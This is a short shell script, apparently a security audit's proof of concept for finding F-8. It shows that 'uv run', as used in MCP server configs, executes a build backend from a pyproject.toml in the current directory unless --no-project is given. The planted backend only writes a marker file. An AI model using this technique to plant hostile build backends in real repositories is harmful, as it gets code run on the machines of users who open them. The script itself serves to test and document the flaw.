#!/bin/sh
# F-8: `uv run` (as used in .mcp.json / servers.json) executes the build backend of a
# pyproject.toml found in the CURRENT WORKING DIRECTORY unless --no-project is given.
# Offline, harmless: the "malicious" backend only writes a marker file under a temp dir.
set -eu
T=$(mktemp -d)
mkdir "$T/proj"
cat > "$T/proj/pyproject.toml" <<'EOF'
[project]
name = "evilproj"
version = "0.0.1"
requires-python = ">=3.8"
[build-system]
requires = []
build-backend = "backend"
backend-path = ["."]
EOF
cat > "$T/proj/backend.py" <<EOF
import pathlib
pathlib.Path("$T/BACKEND_RAN").write_text("x")
raise SystemExit("stop after marker")
EOF
echo 'print("server stand-in ran")' > "$T/server.py"
uv --version
cd "$T/proj"
echo "--- without --no-project"
UV_OFFLINE=1 uv run --quiet python "$T/server.py" >/dev/null 2>&1 || true
[ -e "$T/BACKEND_RAN" ] && echo "RESULT: project build backend EXECUTED" || echo "RESULT: backend not executed"
rm -f "$T/BACKEND_RAN"
echo "--- with --no-project"
UV_OFFLINE=1 uv run --quiet --no-project python "$T/server.py" 2>&1 || true
[ -e "$T/BACKEND_RAN" ] && echo "RESULT: project build backend EXECUTED" || echo "RESULT: backend not executed"
rm -rf "$T"
